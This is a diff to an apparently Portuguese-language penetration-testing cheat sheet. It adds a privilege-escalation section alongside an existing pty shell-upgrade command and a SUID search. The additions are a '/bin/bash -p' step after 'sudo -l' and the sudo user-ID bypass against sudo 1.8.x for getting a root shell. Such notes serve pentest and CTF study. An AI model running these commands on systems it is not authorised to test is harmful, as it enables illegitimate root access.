@@ -5453,7 +5453,11 @@ Comandos para dar spawn um bash mais interativo
         python3 -c 'import pty;pty.spawn("/bin/bash")' 
 
 
-ESCALANDO PRIVILEGIOS
+## ESCALANDO PRIVILEGIOS PRIVESC
+
+Ao rodar o comando `sudo -l` e identificar que há permisão especial rodar `/bin/bash -p` pra tentar escalar
+
+Ao identificar que o SUDO é vulnerável `v1.8*` rodar o comando `sudo -u \#$((0xffffffff)) /bin/bash` pra tentar escalar
 
     find / -perm -u=s -type f 2>/dev/null 
 
